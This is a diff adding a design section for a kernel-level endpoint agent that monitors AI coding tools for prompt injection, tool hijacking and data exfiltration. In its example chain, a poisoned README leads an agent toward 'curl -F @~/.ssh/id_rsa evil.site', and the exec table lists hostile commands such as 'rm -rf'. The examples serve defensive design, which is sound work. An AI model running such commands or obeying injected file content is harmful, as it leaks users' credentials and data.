@@ -660,3 +660,111 @@ A background service, so protection doesn't depend only on a request being made:
 4. **Act and learn:** quarantine files, open SOC tickets, push signatures to every gateway (Falcon Loop); a nightly red-team self-test replays the attack corpus to catch regressions.
 
 Deployment: a Kubernetes DaemonSet or CronJob on servers and a light agent on endpoints, sharing the Redis/Qdrant Risk DB with the inline gateways.
+
+---
+
+## 19. Future: CheckPoint Zero Kernel Agent
+
+Today AI-EDR guards the paths AI tools agree to use: the proxy, hooks, the browser extension and the SDK clients. The **Kernel Agent** moves the checkpoint into the operating system. It is one small agent per laptop or server, deployed the way an EDR sensor is. It hooks the kernel, so **every AI process passes through it whether or not the app cooperates**. The name is literal: the checkpoint sits at ring 0.
+
+### 19.1 Why the kernel
+
+| Today's integration | Can be bypassed by | The kernel agent sees |
+|---|---|---|
+| Browser extension | Another browser, the desktop app, a curl script | Every process |
+| Claude Code / Gemini hooks | A tool without hooks (Cursor, Aider, custom scripts) | Every AI tool, including unknown "shadow AI" |
+| Proxy (`ANTHROPIC_BASE_URL`) | Unsetting the environment variable | Network redirection enforced by the kernel |
+| SDK client | Not using the SDK | Raw syscalls: file open, exec, connect |
+| *(none)* | Local models (Ollama, llama.cpp), which never touch the network | The file reads and process actions around them |
+
+Hooks and extensions protect the tool. The kernel agent protects the machine, and the AI agent can't switch it off.
+
+### 19.2 Overview
+
+```
+┌──────────────────────── ENDPOINT (laptop / build server / VDI) ────────────────────────┐
+│  AI processes: claude · gemini-cli · cursor · python(openai) · chrome→AI sites · ollama │
+│       │ open()          │ execve()          │ connect()/TLS         │ (TLS libs)       │
+│ ══════╪═════════════════╪═══════════════════╪═══════════════════════╪════════ KERNEL ═ │
+│  ┌────▼─────┐     ┌─────▼─────┐      ┌──────▼───────┐       ┌───────▼──────┐           │
+│  │ FILE     │     │ EXEC      │      │ NETWORK      │       │ TLS plaintext│           │
+│  │ LSM      │     │ LSM       │      │ cgroup/      │       │ tap: uprobes │           │
+│  │ file_open│     │ bprm_check│      │ connect →    │       │ SSL_write/   │           │
+│  │          │     │           │      │ local proxy  │       │ SSL_read     │           │
+│  └────┬─────┘     └─────┬─────┘      └──────┬───────┘       └───────┬──────┘           │
+│       └─────────────────┴─ ring buffer / AUTH events ┴──────────────┘                  │
+│ ════════════════════════════════════╪════════════════════════════════════════════════ │
+│                     ┌───────────────▼──────────────────────────────────┐               │
+│                     │ checkpointd (user-space daemon)                  │               │
+│                     │ ① AI-process identifier (lineage, binary hash,   │               │
+│                     │   LLM domains)                                   │               │
+│                     │ ② Local AI-EDR engine (Falcon: T1 / T2 ONNX / T3)│               │
+│                     │ ③ Local Risk DB replica + verdict cache          │               │
+│                     │ ④ Enforcer: allow / deny / sanitize / kill tree  │               │
+│                     │ ⑤ Local transparent proxy (rewrites prompts)     │               │
+│                     │ ⑥ Tamper guard + offline policy cache            │               │
+│                     └───────────────┬──────────────────────────────────┘               │
+└─────────────────────────────────────┼──────────────────────────────────────────────────┘
+                                      │ mTLS: telemetry ↑   policy + Risk DB deltas ↓
+                  ┌───────────────────▼────────────────────────────────────┐
+                  │ AI-EDR control plane (today's gateway + console, fleet)│
+                  │ Quarantine vault · SIEM · Falcon Loop: learn on one    │
+                  │ endpoint → push to all                                 │
+                  └────────────────────────────────────────────────────────┘
+```
+
+### 19.3 The four kernel checkpoints
+
+| Checkpoint | Trigger | Action |
+|---|---|---|
+| **① File** (indirect injection) | An AI process opens a document (PDF, DOCX, HTML, MD, code, RAG chunk) | Scan with `indirect_file_scanner` + CDR. Clean: allow. Poisoned: redirect the read to a sanitized shadow copy (FUSE overlay / minifilter reparse), or deny under BLOCK. Verdicts are cached by `(inode, mtime, hash)` |
+| **② Exec** (tool hijack) | A child of an AI agent starts a process (`curl … ~/.ssh`, `rm -rf`, `aws s3 cp`) | Behavioral IOAs + agent process tree (`behavioral_ioa.py`). Deny the exec and quarantine the whole lineage |
+| **③ Network** (non-bypassable gateway) | An AI process connects to an LLM endpoint or an unknown domain | LLM endpoints are transparently redirected to the local AI-EDR proxy, where prompts are blocked or rewritten with no app config. Unknown egress (pastebin, webhooks, raw IPs) is denied. TLS uses the enterprise root CA |
+| **④ TLS tap** (visibility) | Pinned or not-yet-listed apps | uprobes on `SSL_write`/`SSL_read` see plaintext before encryption. These are observe-only, so enforcement means killing the connection or process |
+
+### 19.4 Inside `checkpointd`
+
+| Component | Reuses existing code | Notes |
+|---|---|---|
+| AI-process identifier | New | Signed-binary hashes, process lineage, LLM-domain matching. Only AI processes get deep inspection |
+| Detection engine | `hidden_trick_analyzer`, `falcon_engine`, `behavioral_ioa`, `command_stripper_cdr`, `decision_engine` | Imported as a library. ONNX DeBERTa runs on CPU |
+| Local Risk DB | `signature_store`, `vector_threat_db` | Replica synced from the control plane. Falcon Loop deltas are pushed to every endpoint |
+| Local proxy | `proxy_router` + adapters | The same 5 platform adapters, bound to 127.0.0.1 |
+| Enforcer | New | Answers kernel AUTH events, swaps in shadow files, kills process trees |
+| Tamper guard | New | Protected process (Windows PPL, macOS system extension), watchdog, heartbeat; "agent offline" raises an alert |
+| Offline mode | New | Cached policy + Risk DB; fail-closed for high-risk tenants (e.g. `samsung_sec_div`) |
+
+**Latency budget:** an in-kernel eBPF map of AI-process PIDs lets non-AI processes, about 99% of events, get an instant ALLOW without leaving the kernel. Cache hit < 50 µs. Tier 1 ≈ 2 ms. A full prompt scan ≈ 17 ms; a large file takes up to ≈ 1 s, so documents in agent workspaces are pre-scanned when they are created or downloaded. This fits the kernel AUTH deadlines (macOS ES allows seconds).
+
+### 19.5 End-to-end: the poisoned README
+
+1. Claude Code calls `open("README.md")`. The file checkpoint finds a hidden `curl … .ssh` command.
+2. The read is redirected to `README.sanitized.md`, and the agent runs the tests on clean text.
+3. Defence in depth: if another injection made it through and the agent runs `curl -F @~/.ssh/id_rsa evil.site`, the exec checkpoint denies it, and the network checkpoint independently denies the connection.
+4. The full chain (prompt → file → command → destination) goes to the quarantine vault. The Falcon Loop learns it, and every endpoint is immune within seconds.
+
+### 19.6 Platform mapping
+
+| Checkpoint | Linux | macOS | Windows |
+|---|---|---|---|
+| File | eBPF LSM `file_open` + fanotify | Endpoint Security `AUTH_OPEN` | Minifilter driver |
+| Exec | eBPF LSM `bprm_check_security` | ES `AUTH_EXEC` | Process-notify callback + ETW |
+| Network | eBPF `cgroup/connect` redirect | Network Extension transparent proxy | WFP callout |
+| TLS tap | uprobes on libssl | Network Extension proxy | ETW / SChannel |
+| Tamper | systemd + LSM self-protection | System extension, MDM-managed | PPL + ELAM |
+
+Rollout uses existing tooling: Intune, Jamf, Ansible, Samsung Knox.
+
+### 19.7 Roadmap and constraints
+
+| Phase | Scope | Effort |
+|---|---|---|
+| P0 | Linux eBPF prototype: exec + connect-redirect for AI processes, calling the existing gateway | Days |
+| P1 | `checkpointd` with the embedded engine, file checkpoint with shadow copies, Risk DB replica sync | Weeks |
+| P2 | macOS Endpoint Security (needs an Apple entitlement), Windows minifilter (needs driver signing) | Months |
+| P3 | Tamper protection, fail-closed policies, fleet console, Falcon Loop pushed company-wide | Months |
+
+Constraints:
+- **Kernel stays thin.** A kernel bug can crash the machine, so all detection logic stays in user space and the kernel only enforces "ask the agent".
+- **Encrypted traffic** can only be rewritten with the enterprise CA. Without it, the TLS tap observes only.
+- **Local models** that touch no files and no network can only be checked at their input and output.
